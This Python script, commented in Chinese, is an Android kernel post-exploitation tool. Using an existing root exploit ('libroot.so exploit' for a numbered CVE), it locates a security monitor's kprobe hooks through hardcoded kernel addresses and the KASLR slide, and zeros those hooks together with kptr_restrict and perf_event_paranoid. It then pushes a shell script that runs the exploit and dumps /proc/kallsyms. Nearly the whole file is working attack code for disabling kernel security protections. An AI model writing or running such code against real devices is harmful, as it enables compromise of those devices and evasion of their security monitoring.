#!/usr/bin/env python3
"""拿到 root 后：定位 dfd 在 kallsyms_open / sysctl 写入口上的 kprobe handler，
   连同 kptr_restrict、sysctl_perf_event_paranoid 一起清零，再试 ksud late-load"""
import subprocess, os, re, sys, time

ADB="/usr/lib/android-sdk/platform-tools/adb"
ENV=dict(os.environ, HOME="/workspace/.adbh")
DEV=os.environ.get("DEV")

KALLSYMS_OPEN=0xffffffc0081bb474
PROC_SYSADMIN=0xffffffc00815058c
KPTR=0xffffffc00a20d4b8
PARANOID=0xffffffc00a1fb3bc
KPROBE_TABLE=0xffffffc00a47d938

def adb(*a, timeout=90):
    try:
        r=subprocess.run([ADB]+list(a),capture_output=True,text=True,timeout=timeout,env=ENV)
        return (r.stdout or "")+(r.stderr or "")
    except subprocess.TimeoutExpired:
        return "TIMEOUT"

def rootcmd(cmd, timeout=90):
    q=cmd.replace('"','\\"')
    return adb("-s",DEV,"shell",'/data/local/tmp/libroot.so su -c "%s"'%q, timeout=timeout)

def read_mem(addrs):
    out={}
    for i in range(0,len(addrs),8):
        chunk=addrs[i:i+8]
        args=" ".join(hex(a) for a in chunk)
        for _ in range(3):
            txt=rootcmd("sh /data/local/tmp/rk.sh "+args)
            line=None
            for ln in txt.splitlines():
                if "rk" in ln and "=" in ln: line=ln
            if not line: continue
            vals={m.group(1):int(m.group(2),16) for m in re.finditer(r"\b([a-h])=(0x[0-9a-fA-F]+)", line)}
            if len(vals)>=len(chunk):
                for k,a in enumerate(chunk): out[a]=vals[chr(ord('a')+k)]
                break
        else:
            for a in chunk: out.setdefault(a,None)
    return out

def main():
    global DEV
    if not DEV:
        print("need DEV"); return 1
    sc=adb("-s",DEV,"shell","cat /data/local/tmp/slide_cache.txt").strip().split()
    boot=adb("-s",DEV,"shell","cat /proc/sys/kernel/random/boot_id").strip()
    if len(sc)<2 or sc[0]!=boot:
        print("slide_cache 与当前 boot 不匹配:",sc,boot); return 2
    slide=int(sc[1],16)
    print("boot=%s slide=%#x"%(boot[:8],slide))
    table=KPROBE_TABLE+slide
    heads=[table+8*i for i in range(64)]
    m=read_mem(heads)
    targets=[]
    for i,h in enumerate(heads):
        node=m.get(h)
        seen=set()
        while node and node not in seen and len(seen)<50:
            seen.add(node)
            mm=read_mem([node, node+0x28, node+0x40])
            nxt=mm.get(node); addr=mm.get(node+0x28); pre=mm.get(node+0x40)
            if addr in (KALLSYMS_OPEN+slide, PROC_SYSADMIN+slide) and pre:
                print("  hit: %#x hook pre=%#x -> 清零 %#x"%(
                    addr, pre, node+0x40))
                targets.append(node+0x40)
            node=nxt or 0
    if not targets:
        print("未找到钩子（可能已被摘除）")
    zs=[hex((t-slide)&0xffffffffffffffff) for t in targets]+[hex(KPTR),hex(PARANOID)]
    print("zerosym targets:",zs)
    script="""#!/system/bin/sh
cd /data/local/tmp || exit 1
S=%#x
rm -f zs_fix.log
CVE98260_LOG=/data/local/tmp/zs_fix.log CVE98260_ZERO_SYMS=%s CVE98260_SELINUX_ONLY=1 PLANT_FAST=1 \\
  nohup timeout -k 5 300 ./libroot.so exploit --slide $S --page-offset 0xffffff7f80000000 \\
  < cve98260/profile.framed > /dev/null 2>&1 &
i=0
while [ $i -lt 150 ]; do grep -qa parked /data/local/tmp/zs_fix.log 2>/dev/null && break; sleep 1; i=$((i+1)); done
pkill -9 -f 'libroot.so exploit' 2>/dev/null
sleep 1
grep -a zerosym /data/local/tmp/zs_fix.log
echo "kptr=$(cat /proc/sys/kernel/kptr_restrict) paranoid=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)"
head -3 /proc/kallsyms
""" % (slide, ",".join(zs))
    open('/workspace/zs_fix.sh','w').write(script)
    adb("-s",DEV,"push","/workspace/zs_fix.sh","/data/local/tmp/zs_fix.sh")
    out=rootcmd("sh /data/local/tmp/zs_fix.sh", timeout=280)
    print(out[-1500:])
    return 0

if __name__=="__main__":
    sys.exit(main())
